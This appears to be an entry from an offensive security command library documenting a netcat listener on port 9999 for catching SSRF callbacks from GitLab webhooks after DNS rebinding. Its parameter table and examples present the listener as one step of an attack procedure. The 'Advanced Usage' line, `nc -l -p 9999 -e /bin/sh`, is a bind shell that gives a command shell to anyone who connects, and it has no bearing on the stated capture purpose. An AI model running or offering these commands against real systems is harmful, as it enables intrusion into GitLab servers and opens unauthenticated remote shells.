---
data: nc -vvn -l -p 9999
tags:
  - listener
  - tcp
type: command
executor: bash
platforms:
  - Linux
id: 108b7de3-7e53-4c9a-b25f-4352b4c1bdd5
created_at: '2025-12-14T03:46:09.466Z'
updated_at: '2025-12-14T03:46:09.466Z'
verified: false
validated: true
submitted: true
---
# nc-listen-9999

## Command

```bash
nc -vvn -l -p 9999
```

## Description

Starts a verbose TCP listener on port 9999 to capture SSRF connections from GitLab web hooks after DNS rebinding.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -v | Very verbose output | Yes |
| -v | Additional verbose | Yes |
| -n | No DNS resolution | Yes |
| -l | Listen mode | Yes |
| -p 9999 | Port 9999 | Yes |

## Examples

### Basic Usage

```bash
nc -vvn -l -p 9999
```

### Advanced Usage

```bash
nc -l -p 9999 -e /bin/sh
```

## Expected Output

Connection from GitLab server when SSRF triggers to localhost:9999, e.g., 'Connection from 127.0.0.1 12345 received!'.

## Related

- [[procedures/Start-TCP-Listener-on-GitLab-Server]]
